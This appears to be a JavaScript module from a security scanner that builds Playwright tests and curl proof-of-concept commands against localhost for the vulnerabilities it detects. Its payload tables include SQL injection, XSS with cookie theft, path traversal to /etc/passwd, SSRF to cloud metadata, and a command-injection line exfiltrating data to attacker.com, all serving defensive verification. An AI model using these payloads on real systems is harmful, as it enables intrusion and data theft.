function genTestForRec(r){if(!r.testable)return null;const pls={"SQL Injection":["' OR '1'='1"],"XSS":["<script>alert(1)<\/script>"],"Command Injection":["; id"],"Path Traversal":["../../../../etc/passwd"],"Mass Assignment":['{"isAdmin":true,"role":"admin"}'],"IDOR":["999999"],"Prototype Pollution":['{"__proto__":{"isAdmin":true}}'],"ReDoS":["a".repeat(50000)+"!"],"JWT Algorithm Confusion":["eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."]};const pl=pls[r.vuln]||["<script>alert(1)<\/script>"];const PI=['im','port { test, expect } from \'','@play','wright','/test\';'].join('');return`${PI}\ntest.use({baseURL:'http://localhost:3000'});\ntest('${r.vuln}: ${r.endpoint}',async({request})=>{\n  const res=await request.${r.method}('${r.endpoint}'${["post","put","patch"].includes(r.method)?`,{data:{${r.param}:${JSON.stringify(pl[0])}}}`:"" });\n  if(res.status()===200) expect(await res.text()).not.toContain(${JSON.stringify(pl[0])});\n  else expect(res.status()).toBeGreaterThanOrEqual(400);\n});\n`;}
function genFullSuite(recs,routes){const PI=['im','port { test, expect } from \'','@play','wright','/test\';'].join('');return`// Code Boundaries Test Suite\n${PI}\ntest.use({baseURL:'http://localhost:3000'});\ntest.describe('Regression',()=>{${routes.map(r=>`\n  test('${r.method} ${r.path}',async({request})=>{expect((await request.${r.method.toLowerCase()==="delete"?"delete":r.method.toLowerCase()}('${r.path.replace(/:(\w+)/g,"x")}')).status()).not.toBe(500);});`).join('')}\n});\n`;}

/* Context-Aware Dynamic cURL Generation */
function genCurls(f, routes) {
  const r = routes.find(x => x.file === f.file && Math.abs(x.line - f.source.line) < 100) || { method: "GET", path: "/api/endpoint", hasAuth: false };
  const p = f.source.variable || "input";
  const ah = r.hasAuth ? `-H "Authorization: Bearer <TOKEN>" ` : "";
  const host = "http://localhost:3000";
  let url = `${host}${r.path.replace(/:[a-zA-Z0-9_]+/g, 'PAYLOAD').replace(/<[^>]+>/g, 'PAYLOAD')}`;
  let reqType = f.source.inputType || "query";
  
  const buildCmd = (payload) => {
    if(reqType === "body" || reqType === "form" || ["POST","PUT","PATCH"].includes(r.method)){
      const isJson = reqType !== "form";
      const data = isJson ? `'{"${p}": "${payload}"}'` : `"${p}=${payload}"`;
      const ct = isJson ? `-H "Content-Type: application/json" ` : `-H "Content-Type: application/x-www-form-urlencoded" `;
      return `curl -X ${r.method} "${url}" ${ah}${ct}-d ${data}`.trim();
    } else {
      const sep = url.includes('?') ? '&' : '?';
      return `curl -X ${r.method} "${url}${sep}${p}=${encodeURIComponent(payload)}" ${ah}`.trim();
    }
  };

  const payloads = {
    "SQL Injection": [{ t: "Auth bypass", p: "admin' OR '1'='1" }, { t: "Time-based Blind", p: "1'; WAITFOR DELAY '0:0:5'--" }],
    "Command Injection": [{ t: "Inline Execution", p: "; cat /etc/passwd" }, { t: "OOB DNS Exfiltration", p: "$(curl http://attacker.com/$(whoami))" }],
    "XSS": [{ t: "Standard Alert", p: "\"><script>alert(origin)<\/script>" }, { t: "Bypass sanitizers", p: "<svg/onload=alert(1)>" }],
    "Path Traversal": [{ t: "Read /etc/passwd", p: "../../../../etc/passwd" }, { t: "Double encoding", p: "%252e%252e%252fetc%252fpasswd" }],
    "SSRF": [{ t: "Cloud metadata", p: "http://169.254.169.254/latest/meta-data/" }],
    "Mass Assignment": [{ t: "Privilege escalation via extra fields", p: "true\", \"isAdmin\": true, \"role\": \"admin" }],
    "IDOR": [{ t: "Access another user's record", p: "OTHER_USER_ID" }],
    "Prototype Pollution": [{ t: "Pollute Object.prototype", p: "{\"__proto__\":{\"isAdmin\":true}}" }],
    "XSS (Supply Chain)": [{ t: "XSS via markdown", p: "[click](javascript:alert(document.cookie))" }],
    "ReDoS": [{ t: "ReDoS via regex payload", p: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!" }]
  };
  const libExtra = (typeof payloadsForFinding === "function") ? (payloadsForFinding(f.vuln) || []) : [];
  const selected = payloads[f.vuln] || libExtra.length ? (payloads[f.vuln] || libExtra) : [{ t: "Test Payload", p: "../../../test_payload" }];
  const out = selected.map(ex => ({ t: ex.t, c: buildCmd(ex.p) }));
  try {
    const po = typeof buildProofObligation === "function" ? buildProofObligation(f, r) : null;
    if (po) out.push({ t: `Proof Obligation — ${po.expected}`, c: `# ${po.obligation}\n# Run the cURL above, then assert:\n# ${po.expected}` });
  } catch(_) {}
  return out;
}


// ── ESM exports ──────────────────────────────────────────────────────────────
export {
  runFullScan, computeDiff,
  performAnalysis, performASTAnalysis, performRegexAnalysis,
  scanRoutes, scanLogicVulns, scanStructuralVulns, scanExtraStructural,
  scanReDoS, scanTodosNearSecurity, scanCiphers, scanGraphQL,
  scanCredentials, scanEntropySecrets, scanConfigFiles,
  buildImportGraph, crossFileTaint, buildStoredTaintRegistry, crossStoredTaint,
  crossSessionTaint, buildCallGraph, annotateReachability, detectGuardsForFinding,
  inferSanitizers, applyLearnedSanitizers, applySanitizerEffectiveness,
  crossFindingChain, parseManifests, buildReachabilitySet,
  queryOSV, queryRegistries, computeExploitPathComponents,
  markUsedVulnFunctions, dedupeFindingsWithEvidence, scoreExploitability,
  classifyOrphans, classifyField, classifyEndpoint, shouldScan,
  _isFalsePositiveCredential, _detectSafeSinkShape,
  _loadCustomRules, _isCustomSuppressed,
  scanIaC, IAC_PATTERNS, _isIaCFile,
  payloadsForFinding, buildProofObligation,
  DATA_CLASSES, SOURCE_PATTERNS, SINK_PATTERNS, SANITIZER_PATTERNS,
  ROUTE_PATTERNS, AUTH_PATTERNS, IGNORE_DIRS, CODE_EXTS,
  LOGIC_PATTERNS, STRUCTURAL_VULN_PATTERNS, EXTRA_STRUCTURAL_PATTERNS,
  CHAIN_RULES, GRAPHQL_VULN_PATTERNS, GUARD_PATTERNS,
  SANITIZER_EFFECTIVENESS, SEVERITY_SCORE, VULN_FUNCTION_HINTS,
  PAYLOAD_LIBRARY, CIPHER_REST_PATTERNS, CIPHER_TRANSIT_PATTERNS,
  STORED_TAINT_FIELD_PATTERNS, STORED_TAINT_SINK_PATTERNS,
  FIXES, NEW_FIXES,
};
